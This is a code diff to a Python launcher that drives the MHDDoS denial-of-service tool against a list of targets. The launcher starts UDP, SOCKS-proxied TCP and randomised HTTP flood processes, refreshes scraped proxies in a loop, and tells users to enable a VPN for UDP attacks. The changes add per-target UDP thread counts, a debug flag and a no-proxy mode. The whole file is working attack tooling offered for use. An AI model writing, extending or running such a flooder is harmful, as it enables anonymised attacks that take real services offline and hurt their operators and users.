@@ -9,7 +9,10 @@ import time
 
 def update_proxies(period):
     os.chdir('proxy-scraper-checker')
-    last_update = os.path.getctime('../MHDDoS/files/proxies')
+    if os.path.exists('../MHDDoS/files/proxies'):
+        last_update = os.path.getctime('../MHDDoS/files/proxies')
+    else:
+        last_update = 0
     # Avoid parsing proxies too often when restart happens
     if (time.time() - last_update) > period / 2:
         subprocess.run(['python3', 'main.py'])
@@ -34,18 +37,23 @@ def calculate_threads(total_threads, total_targets):
     return s4_threads, s5_threads, http_threads
 
 
-def run_ddos(targets, total_threads, period, rpc, http_methods):
+def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, no_proxies, debug):
     os.chdir('MHDDoS')
 
-    s4_threads, s5_threads, http_threads = calculate_threads(total_threads, len(targets))
+    debug = 'debug' if debug else ''
+    if no_proxies:
+        s4_threads, s5_threads, http_threads = 0, 0, 0
+    else:
+        s4_threads, s5_threads, http_threads = calculate_threads(total_threads, len(targets))
+
     processes = []
     for target in targets:
         # UDP
         if target.lower().startswith('udp://'):
             print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
-            udp_threads = s4_threads + s5_threads + http_threads
             process = subprocess.Popen([
-                'python3', 'start.py', 'UDP', target[6:], str(udp_threads), str(period)
+                'python3', 'start.py', 'UDP', target[6:],
+                str(udp_threads), str(period), debug
             ])
             processes.append(process)
 
@@ -57,7 +65,7 @@ def run_ddos(targets, total_threads, period, rpc, http_methods):
             ):
                 process = subprocess.Popen([
                     'python3', 'start.py', 'TCP', target[6:],
-                    str(threads), str(period), socks_type, socks_file
+                    str(threads), str(period), socks_type, socks_file, debug
                 ])
                 processes.append(process)
 
@@ -71,7 +79,7 @@ def run_ddos(targets, total_threads, period, rpc, http_methods):
                 method = random.choice(http_methods)
                 process = subprocess.Popen([
                     'python3', 'start.py', method, target, socks_type,
-                    str(threads), socks_file, str(rpc), str(period),
+                    str(threads), socks_file, str(rpc), str(period), debug
                 ])
                 processes.append(process)
 
@@ -81,14 +89,14 @@ def run_ddos(targets, total_threads, period, rpc, http_methods):
     os.chdir('../')
 
 
-def start(total_threads, period, targets, rpc, http_methods):
+def start(total_threads, period, targets, rpc, udp_threads, http_methods, debug):
     shutil.copy('proxy_config.py', 'proxy-scraper-checker/config.py')
     no_proxies = all(target.lower().startswith('udp://') for target in targets)
 
     while True:
         if not no_proxies:
             update_proxies(period)
-        run_ddos(targets, total_threads, period, rpc, http_methods)
+        run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, no_proxies, debug)
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -100,21 +108,20 @@ def init_argparse() -> argparse.ArgumentParser:
     )
     parser.add_argument(
         '-t',
-        dest='threads',
+        '--threads',
         type=int,
         default=100 * multiprocessing.cpu_count(),
         help='Total number of threads(default is 100 * CPU Cores)',
     )
     parser.add_argument(
         '-p',
-        dest='period',
+        '--period',
         type=int,
         default=600,
         help='How often to update the proxies (default is 300)',
     )
     parser.add_argument(
         '--proxy-timeout',
-        dest='proxy_timeout',
         metavar='TIMEOUT',
         type=float,
         default=3,
@@ -123,10 +130,21 @@ def init_argparse() -> argparse.ArgumentParser:
     )
     parser.add_argument(
         '--rpc',
-        dest='rpc',
         type=int,
         default=100,
         help='How many requests to send on a single proxy connection (default is 100)',
+    )
+    parser.add_argument(
+        '--udp-threads',
+        type=int,
+        default=1,
+        help='Threads to run per UDP target',
+    )
+    parser.add_argument(
+        '--debug',
+        action='store_true',
+        default=False,
+        help='Enable debug output from MHDDoS',
     )
     parser.add_argument(
         '--http-methods',
@@ -145,5 +163,7 @@ if __name__ == '__main__':
         args.period,
         args.targets,
         args.rpc,
+        args.udp_threads,
         args.http_methods,
+        args.debug,
     )
